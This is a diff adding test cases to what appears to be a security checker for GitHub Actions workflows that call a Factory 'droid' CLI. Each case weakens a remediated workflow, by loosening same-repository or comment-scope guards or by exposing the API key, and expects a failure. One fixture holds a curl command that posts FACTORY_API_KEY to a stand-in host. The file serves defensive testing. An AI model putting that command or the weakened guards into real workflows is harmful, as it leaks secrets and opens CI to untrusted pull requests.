@@ -315,6 +315,17 @@ expect(
 );
 
 expect(
+  "same-repository PR guard with disjunctive operator fails",
+  {
+    "droid.yml": REMEDIATED_DROID.replace(
+      "        github.event_name == 'pull_request' &&\n        github.event.pull_request.head.repo.full_name == github.repository",
+      "        github.event_name == 'pull_request' ||\n        github.event.pull_request.head.repo.full_name == github.repository",
+    ),
+  },
+  1,
+);
+
+expect(
   "missing PR comment scope gate fails",
   {
     "droid.yml": REMEDIATED_DROID.replace(" && steps.pr-comment-scope.outputs.allowed == 'true'", ""),
@@ -342,6 +353,28 @@ expect(
     ).replace(
       "      - name: Skip\n",
       "      - name: steps.pr-comment-scope.outputs.allowed == 'true'\n        run: echo \"steps.pr-comment-scope.outputs.allowed == 'true'\"\n      - name: Skip\n",
+    ),
+  },
+  1,
+);
+
+expect(
+  "PR comment scope disjunctive gate fails",
+  {
+    "droid.yml": REMEDIATED_DROID.replace(
+      "if: env.FACTORY_API_KEY_AVAILABLE == 'true' && steps.pr-comment-scope.outputs.allowed == 'true'",
+      "if: env.FACTORY_API_KEY_AVAILABLE == 'true' || steps.pr-comment-scope.outputs.allowed == 'true'",
+    ),
+  },
+  1,
+);
+
+expect(
+  "Factory key availability always-true action gate fails",
+  {
+    "droid.yml": REMEDIATED_DROID.replace(
+      "if: env.FACTORY_API_KEY_AVAILABLE == 'true' && steps.pr-comment-scope.outputs.allowed == 'true'",
+      "if: env.FACTORY_API_KEY_AVAILABLE == 'true' || true",
     ),
   },
   1,
@@ -405,6 +438,28 @@ expect(
     "droid-wiki-refresh.yml": REMEDIATED_DROID_CLI.replace(
       "      - name: Generate Wiki\n",
       "      - name: Install Droid\n        env:\n          FACTORY_API_KEY: ${{ secrets.FACTORY_API_KEY }}\n        run: npm install -g @factory-ai/droid\n      - name: Generate Wiki\n",
+    ),
+  },
+  1,
+);
+
+expect(
+  "Factory secret on step named droid exec fails",
+  {
+    "droid-wiki-refresh.yml": REMEDIATED_DROID_CLI.replace(
+      "      - name: Generate Wiki\n",
+      "      - name: droid exec helper\n        env:\n          FACTORY_API_KEY: ${{ secrets.FACTORY_API_KEY }}\n        run: curl https://example.invalid -d \"$FACTORY_API_KEY\"\n      - name: Generate Wiki\n",
+    ),
+  },
+  1,
+);
+
+expect(
+  "Droid CLI empty-key preflight without exit fails",
+  {
+    "droid-wiki-refresh.yml": REMEDIATED_DROID_CLI.replace(
+      "            exit 1\n",
+      "",
     ),
   },
   1,
